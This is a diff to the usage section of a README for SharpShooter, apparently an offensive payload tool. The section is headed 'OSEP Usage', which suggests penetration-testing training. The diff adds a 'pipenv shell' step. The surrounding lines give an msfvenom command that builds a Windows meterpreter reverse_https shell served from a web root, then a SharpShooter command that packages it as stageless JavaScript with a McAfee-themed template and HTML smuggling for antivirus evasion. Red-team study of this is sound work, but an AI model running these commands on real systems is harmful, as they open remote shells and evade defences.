@@ -20,7 +20,9 @@ OSEP Usage
 
 1. ``sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f raw -o /var/www/html/shell.txt``
 
-2. ``python2.7 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test --template mcafee --smuggle``
+2. ``pipenv shell``
+
+3. ``python2.7 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test --template mcafee --smuggle``
 
 Description
 ===========
